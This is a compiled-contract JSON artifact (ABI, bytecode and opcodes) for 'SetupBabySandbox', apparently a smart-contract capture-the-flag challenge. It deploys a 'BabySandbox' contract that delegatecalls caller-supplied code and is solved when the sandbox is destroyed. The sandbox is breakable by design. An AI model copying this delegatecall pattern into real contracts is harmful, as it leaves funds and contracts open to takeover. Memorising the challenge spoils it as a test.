{
  "contracts/babysandbox/SetupBabySandbox.sol": {
    "SetupBabySandbox": {
      "abi": [
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "inputs": [],
          "name": "isSolved",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "sandbox",
          "outputs": [
            {
              "internalType": "contract BabySandbox",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "608060405234801561001057600080fd5b5060405161001d9061007e565b604051809103906000f080158015610039573d6000803e3d6000fd5b506000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061008b565b61014c8061018d83390190565b60f4806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c80631984916f14603757806364d98f6e146069575b600080fd5b603d6087565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b606f60ab565b60405180821515815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000806000543b9050600081149150509056fea26469706673582212206089fa941b8165090ae4df42fc64247d15c79ad8fd4cc6b6c962740f8130b2e564736f6c63430007000033608060405234801561001057600080fd5b5061012c806100206000396000f3fe608060405260043610601c5760003560e01c8063522bb704146021575b600080fd5b606060048036036020811015603557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506062565b005b30331415609a57600080600080845af46000811460845760018114608e576098565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505b61f0005a101560a857600080fd5b366000803760008036600030614000fa60c057600080fd5b6000803660008030614000f16000811460de576001811460e85760f2565b3d6000803e3d6000fd5b3d6000803e3d6000f35b505056fea26469706673582212208fdbfa6bf9f1f15affb8fe6a162950ff955101325b72cf5bdf47ed43fa92eb7464736f6c63430007000033",
          "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x1D SWAP1 PUSH2 0x7E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 PUSH1 0x0 CREATE DUP1 ISZERO DUP1 ISZERO PUSH2 0x39 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH2 0x8B JUMP JUMPDEST PUSH2 0x14C DUP1 PUSH2 0x18D DUP4 CODECOPY ADD SWAP1 JUMP JUMPDEST PUSH1 0xF4 DUP1 PUSH2 0x99 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x32 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1984916F EQ PUSH1 0x37 JUMPI DUP1 PUSH4 0x64D98F6E EQ PUSH1 0x69 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3D PUSH1 0x87 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x6F PUSH1 0xAB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SLOAD EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 EQ SWAP2 POP POP SWAP1 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x89 STATICCALL SWAP5 SHL DUP2 PUSH6 0x90AE4DF42FC PUSH5 0x247D15C79A 0xD8 REVERT 0x4C 0xC6 0xB6 0xC9 PUSH3 0x740F81 ADDRESS 0xB2 0xE5 PUSH5 0x736F6C6343 STOP SMOD STOP STOP CALLER PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x12C DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x522BB704 EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH1 0x35 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x62 JUMP JUMPDEST STOP JUMPDEST ADDRESS CALLER EQ ISZERO PUSH1 0x9A JUMPI PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 DUP5 GAS DELEGATECALL PUSH1 0x0 DUP2 EQ PUSH1 0x84 JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0x8E JUMPI PUSH1 0x98 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP JUMPDEST PUSH2 0xF000 GAS LT ISZERO PUSH1 0xA8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST CALLDATASIZE PUSH1 0x0 DUP1 CALLDATACOPY PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 ADDRESS PUSH2 0x4000 STATICCALL PUSH1 0xC0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 CALLDATASIZE PUSH1 0x0 DUP1 ADDRESS PUSH2 0x4000 CALL PUSH1 0x0 DUP2 EQ PUSH1 0xDE JUMPI PUSH1 0x1 DUP2 EQ PUSH1 0xE8 JUMPI PUSH1 0xF2 JUMP JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 RETURN JUMPDEST POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DUP16 0xDB STATICCALL PUSH12 0xF9F1F15AFFB8FE6A162950FF SWAP6 MLOAD ADD ORIGIN JUMPDEST PUSH19 0xCF5BDF47ED43FA92EB7464736F6C6343000700 STOP CALLER "
        },
        "methodIdentifiers": {
          "isSolved()": "64d98f6e",
          "sandbox()": "1984916f"
        }
      }
    }
  }
}